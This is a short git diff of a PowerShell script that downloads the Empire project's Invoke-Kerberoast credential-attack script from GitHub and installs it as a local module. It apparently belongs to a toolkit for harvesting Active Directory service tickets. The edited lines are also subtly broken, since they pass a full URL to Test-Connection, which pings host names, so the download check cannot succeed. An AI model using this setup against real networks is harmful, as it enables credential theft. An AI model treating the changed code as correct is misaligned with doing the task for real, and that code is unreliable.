@@ -27,6 +27,7 @@ else
 	Write-Host 	"Failed to create the capture folder, it already exists" -ForegroundColor Red
 }
 $modules=split-path $SCRIPT:MyInvocation.MyCommand.Path -parent
+$client = New-Object System.Net.WebClient
 #specify modules folder
 $modulepath=$env:psmodulepath.split(';')[0].split(' ')
 Write-Host "Using Module path: $modulepath" -ForegroundColor Green
@@ -39,10 +40,9 @@ If(!(test-path $modulepath/Kerberoast))
 
 #download Kerberoast
 Write-Host "Fetching Kerberoast module..."
-$client = New-Object System.Net.WebClient
-If(!($client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1","$modulepath/Kerberoast/Kerberoast.psm1")))
+If(Test-Connection -ComputerName "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1" -Count 1 -Quiet)
 {
-	Write-Host "Attemping to fetch module from GitHub..."
+$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1","$modulepath/Kerberoast/Kerberoast.psm1")
 }
 else
 {
